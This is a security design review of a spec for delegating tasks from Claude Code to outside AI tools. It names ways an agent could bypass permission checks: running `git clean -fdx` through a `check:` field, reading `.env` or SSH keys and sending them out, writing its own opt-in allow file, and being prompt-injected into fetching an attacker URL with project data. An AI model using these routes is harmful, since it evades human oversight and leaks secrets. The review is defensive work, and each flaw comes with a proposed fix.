# Review round 1: agent-roles design spec

Date: 2026-10-08. Reviewer verdict: **blocked** (4 security, 3 contract/brief-fidelity).
Verified by the reviewer: A1, A2, A11, A15, A16, the codex "Not logged in" claim,
D12's `agent` setting.

## Blocking

1. **Security: `check:` lets the wrapper run any command without Claude Code's checks**
   (C3 `check`, C2 `Bash(ai-delegate *)`, phase 3 goal). A brief with `check: git clean -fdx`
   (or any 🔴 operation) runs unseen inside an auto-allowed `ai-delegate run`; the sandbox
   mounts the real working tree. Fix: the wrapper never runs `check`; the lead or the native
   writer runs it as its own Bash call, judged by the normal checks.

2. **Security: brief paths are not confined** (C3 `inputs`/`outputs`/`report`, C5
   `--continue <report>`, I5). `inputs: .env` or `../../.ssh/id_ed25519` is read by the
   wrapper and sent to Google, unseen by Claude Code's read checks (global §1 🔴 on secrets).
   `outputs: .git/hooks/pre-commit` or a source file breaks I10 "never code"; `report:` can
   land outside the repo. Fix in the contract: every path realpaths inside the top level;
   secret patterns refused; `outputs` limited to text files (e.g. by extension) and never
   under `.git`; `report` must be under `.ai-delegate/`.

3. **Security: the opt-in gate can be written by the agent it gates** (C2, I4, D3).
   `~/.config/ai-delegate/allow` is checked first and an agent can create it (`~/.config` is
   writable). The brief defines the opt-in as "permission rule + auto-mode entry"; on the host
   the spec swaps that for this file. `$AI_DELEGATE_ROUTING` is looked up first, so any caller
   can route the runner or implementer to `agy`, bypassing the runner non-goal and I6.
   Fix: accept only an allow file the invoking user cannot write (root-owned, under `/etc`), or
   require user/managed-settings rules as the host opt-in as the brief says; the wrapper refuses
   external routes for roles without an S3 confinement profile, whatever table is in use; list
   the host-mechanism change as a decision for the user.

4. **Security: the scout can leak inlined project content to arbitrary hosts** (C3 `inputs`
   for route `scout`, I6). A prompt-injected page makes the scout fetch
   `https://attacker/?q=<inlined content>`; the opt-in covers Google, not third parties.
   Fix: C3 rejects `inputs:` for scout routes; the prompt carries the question only.

5. **Contract gap: what happens after a fallback** (D1, D5, C4 `ran_on.fallback_reason`,
   phase 4). After exit 3 and a `pending` report the spec does not say whether the native
   agent gets the same brief, which report path it writes, how it learns `fallback_reason`,
   or whether its report replaces the pending one. Fix: define the hand-over in C4/C5.

6. **Brief decisions dropped without being listed for the user.** Runner "kept alive per
   milestone" is not carried, and phase 2's `global.md` changes add no §2 "Agent lifetimes"
   entries for runner, scout, writer or second reviewer. Writer: the brief's "keys and source
   strings extracted by script" and "a script checks key sets, placeholders, markup and plural
   forms" are dropped, `check` is optional, and a generic checker is a non-goal the brief did
   not decline. Fix: honour them or add them as D-items.

7. **Phase 2 cannot finish without an unlisted host step, and conflicts with I12.**
   `ai-knowledge render` runs on the host; in the sandbox `~/.claude/agents` is a read-only bind
   mount of the host render (`create-ai-sandbox.sh` lines 2134-2135); `~/knowledge` main stays
   unpushed until a host sync; on the host `wire_host` writes symlinks into `~/.claude/agents`,
   which I12 forbids as worded; phase 3's contract depends on the rendered bodies. Fix: name
   the host sync and render as a batched user-run step at the end of phase 2, and limit I12 to
   code this work adds, exempting the existing render.

## Non-blocking

- **D4:** `global.md` applies everywhere and renders for four tools; replacing its tier
  sentence with a pointer to a dev-tools table leaves no tier guidance where no table exists.
  Keep the defaults in §2 with the table as an override.
- **S1 vs phase 5:** S1's rule needs only "`--agent` keeps CLAUDE.md"; phase 5 also needs the
  default prompt; "keeps CLAUDE.md, drops the default prompt" is undecided;
  `--append-system-prompt-file` not considered. A9 is observable now: the reviewer subagent
  received the user-level CLAUDE.md in its context.
- **I1** rests on prose only: the managed `Bash(agy -p *)` and `Bash(ai-delegate *)` rules let
  a native runner or writer with a shell delegate without a prompt; I6 sets a stricter bar for
  its own case.
- **`second-reviewer`** rendered as a Claude Code subagent with read/search tools invites a
  native Claude spawn, contradicting I10's "vendor other than Anthropic".
- **S3** checks only `~/.claude`; confinement should also cover the mounted repo by absolute
  path and `~/.config` (`~/.config/gcloud` exists here).
